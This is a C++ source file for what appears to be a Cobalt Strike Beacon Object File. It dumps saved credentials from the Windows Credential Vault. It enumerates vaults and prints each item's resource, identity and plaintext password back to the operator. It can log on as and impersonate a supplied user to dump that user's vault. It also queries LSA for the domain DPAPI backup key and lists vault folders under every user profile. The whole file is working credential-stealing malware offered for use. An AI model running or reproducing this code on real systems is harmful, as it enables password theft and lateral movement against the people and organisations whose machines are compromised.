#include <windows.h>
#include <ntsecapi.h>
#include <wincrypt.h>

typedef struct _VAULT_ITEM_DATA {
    DWORD SchemaElementId;
    DWORD unk0;
    DWORD Type;
    DWORD unk1;
    union {
        PWSTR String;
        PVOID Blob;
    } data;
} VAULT_ITEM_DATA, * PVAULT_ITEM_DATA;

typedef struct _VAULT_ITEM {
    GUID SchemaId;
    PWSTR FriendlyName;
    PVAULT_ITEM_DATA Resource;
    PVAULT_ITEM_DATA Identity;
    PVAULT_ITEM_DATA Authenticator;
    PVAULT_ITEM_DATA Package;
    FILETIME LastWritten;
    DWORD Flags;
    DWORD PropertiesCount;
    PVAULT_ITEM_DATA Properties;
} VAULT_ITEM, * PVAULT_ITEM;

typedef struct _VCRD_HEADER {
    DWORD Signature;
    DWORD Version;
    GUID  MasterKeyGuid;
} VCRD_HEADER;

extern "C" {
#include "_include/beacon.h"

    DECLSPEC_IMPORT int WINAPI USER32$wsprintfW(LPWSTR, LPCWSTR, ...);
    DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
    DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$FindFirstFileW(LPCWSTR, LPWIN32_FIND_DATAW);
    DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
    DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindClose(HANDLE);
    DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileAttributesW(LPCWSTR);
    DECLSPEC_IMPORT HLOCAL  WINAPI KERNEL32$LocalFree(HLOCAL);
    DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
    DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError();

    DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LogonUserA(LPCSTR, LPCSTR, LPCSTR, DWORD, DWORD, PHANDLE);
    DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
    DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$RevertToSelf();
    DECLSPEC_IMPORT DWORD   WINAPI ADVAPI32$LsaOpenPolicy(PLSA_UNICODE_STRING, PLSA_OBJECT_ATTRIBUTES, ACCESS_MASK, PLSA_HANDLE);
    DECLSPEC_IMPORT NTSTATUS WINAPI ADVAPI32$LsaRetrievePrivateData(LSA_HANDLE, PLSA_UNICODE_STRING, PVOID*);
    DECLSPEC_IMPORT DWORD   WINAPI ADVAPI32$LsaFreeMemory(PVOID);
    DECLSPEC_IMPORT DWORD   WINAPI ADVAPI32$LsaClose(LSA_HANDLE);
    DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LookupAccountNameA(LPCSTR, LPCSTR, PSID, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
    DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);

    DECLSPEC_IMPORT DWORD   WINAPI VAULTCLI$VaultEnumerateVaults(DWORD, PDWORD, GUID**);
    DECLSPEC_IMPORT DWORD   WINAPI VAULTCLI$VaultOpenVault(GUID*, DWORD, HANDLE*);
    DECLSPEC_IMPORT DWORD   WINAPI VAULTCLI$VaultEnumerateItems(HANDLE, DWORD, PDWORD, PVOID*);
    DECLSPEC_IMPORT DWORD   WINAPI VAULTCLI$VaultGetItem(
        HANDLE,
        GUID*,
        PVAULT_ITEM_DATA,
        PVAULT_ITEM_DATA,
        PVAULT_ITEM_DATA,
        HWND,
        DWORD,
        PVAULT_ITEM*
    );
    DECLSPEC_IMPORT DWORD   WINAPI VAULTCLI$VaultFree(PVOID);
    DECLSPEC_IMPORT DWORD   WINAPI VAULTCLI$VaultCloseVault(HANDLE*);

    void go(char* args, int len);
}

int internal_wcscmp(const wchar_t* s1, const wchar_t* s2)
{
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned short*)s1 - *(unsigned short*)s2;
}

void DumpCurrentContextVaults()
{
    DWORD vaultCount = 0;
    GUID* vaultGuids = NULL;

    if (VAULTCLI$VaultEnumerateVaults(0, &vaultCount, &vaultGuids) != 0 || !vaultGuids)
        return;

    for (DWORD i = 0; i < vaultCount; i++) {
        HANDLE hVault = NULL;

        if (VAULTCLI$VaultOpenVault(&vaultGuids[i], 0, &hVault) != 0 || !hVault)
            continue;

        DWORD itemCount = 0;
        PVOID items = NULL;

        if (VAULTCLI$VaultEnumerateItems(hVault, 0, &itemCount, &items) == 0 && items) {
            PVAULT_ITEM vaultItems = (PVAULT_ITEM)items;

            for (DWORD j = 0; j < itemCount; j++) {
                PVAULT_ITEM fullItem = NULL;

                if (VAULTCLI$VaultGetItem(
                    hVault,
                    &vaultItems[j].SchemaId,
                    vaultItems[j].Resource,
                    vaultItems[j].Identity,
                    vaultItems[j].Package,
                    NULL,
                    0,
                    &fullItem
                ) == 0 && fullItem)
                {
                    BeaconPrintf(
                        CALLBACK_OUTPUT,
                        "    [+] Resource: %S\n        Identity: %S\n        Password: %S",
                        fullItem->Resource ? fullItem->Resource->data.String : L"N/A",
                        fullItem->Identity ? fullItem->Identity->data.String : L"N/A",
                        fullItem->Authenticator ? fullItem->Authenticator->data.String : L"N/A"
                    );

                    VAULTCLI$VaultFree(fullItem);
                }
            }

            VAULTCLI$VaultFree(items);
        }

        VAULTCLI$VaultCloseVault(&hVault);
    }

    VAULTCLI$VaultFree(vaultGuids);
}

void go(char* args, int len)
{
    KERNEL32$LoadLibraryA("vaultcli.dll");

    datap parser;
    BeaconDataParse(&parser, args, len);

    char* targetUser = BeaconDataExtract(&parser, NULL);
    char* targetPass = BeaconDataExtract(&parser, NULL);
    char* targetDom = BeaconDataExtract(&parser, NULL);

    if (targetUser && targetPass && targetPass[0]) {
        HANDLE hToken = NULL;

        if (ADVAPI32$LogonUserA(targetUser, targetDom, targetPass, 2, 0, &hToken)) {
            if (ADVAPI32$ImpersonateLoggedOnUser(hToken)) {
                BeaconPrintf(
                    CALLBACK_OUTPUT,
                    "[+] Impersonating %s\\%s...\n\nDumping Vaults:",
                    targetDom,
                    targetUser
                );

                DumpCurrentContextVaults();
                ADVAPI32$RevertToSelf();
            }

            KERNEL32$CloseHandle(hToken);
        }
        else {
            BeaconPrintf(
                CALLBACK_ERROR,
                "Logon failed for %s. Error: %d",
                targetUser,
                KERNEL32$GetLastError()
            );
        }

        return;
    }

    LSA_HANDLE hPolicy;
    LSA_OBJECT_ATTRIBUTES objAttr = { 0 };
    objAttr.Length = sizeof(objAttr);

    LSA_UNICODE_STRING secretName = {
        34,
        36,
        (PWSTR)L"G_DPAPI_MASTERKEY"
    };

    PVOID secretData = NULL;

    if (ADVAPI32$LsaOpenPolicy(NULL, &objAttr, 0x4, &hPolicy) == 0) {
        if (ADVAPI32$LsaRetrievePrivateData(hPolicy, &secretName, &secretData) == 0 && secretData) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Domain DPAPI Backup Key found in LSA.");
            ADVAPI32$LsaFreeMemory(secretData);
        }
        ADVAPI32$LsaClose(hPolicy);
    }

    DumpCurrentContextVaults();

    WIN32_FIND_DATAW fd;
    HANDLE hFind = KERNEL32$FindFirstFileW(L"C:\\Users\\*", &fd);

    if (hFind == INVALID_HANDLE_VALUE)
        return;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            continue;

        if (!internal_wcscmp(fd.cFileName, L".") ||
            !internal_wcscmp(fd.cFileName, L".."))
            continue;

        wchar_t path[MAX_PATH];
        USER32$wsprintfW(
            path,
            L"C:\\Users\\%s\\AppData\\Local\\Microsoft\\Vault",
            fd.cFileName
        );

        if (KERNEL32$GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Vault found for: %S", fd.cFileName);
        }

    } while (KERNEL32$FindNextFileW(hFind, &fd));

    KERNEL32$FindClose(hFind);
}
